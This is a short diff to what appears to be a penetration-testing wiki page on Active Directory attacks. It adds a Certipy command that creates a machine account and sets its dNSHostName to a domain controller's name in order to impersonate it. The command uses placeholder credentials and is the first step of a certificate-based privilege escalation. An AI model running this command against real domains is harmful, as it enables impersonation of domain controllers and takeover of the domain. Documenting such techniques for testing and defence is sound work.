@@ -78,6 +78,14 @@ bloodyAD.py -d $DOMAIN -u $USER -p $PASSWORD --host $DC_IP getObjectAttributes '
 ```
 {% endcode %}
 
+
+
+[Certipy](https://github.com/ly4k/Certipy) tool can also add a machine account and amend the `dNSHostName` property with the following command liner.
+
+<pre class="language-bash"><code class="lang-bash"><strong># Adding a computer account and setting the dNSHostName to impersonate
+</strong>certipy account create -u '$USER@DOMAIN' -p '$PASSWORD' -user '$COMPUTER_NAME' -pass '$COMPUTER_PASS' -dns '$DC_NAME.$DOMAIN'
+</code></pre>
+
 {% hint style="info" %}
 The Domain Components (DC) are the different parts of the domain name (`DC=domain,DC=local` for `domain.local`, or `DC=sub,DC=domain,DC=local` for `sub.domain.local`).
 {% endhint %}
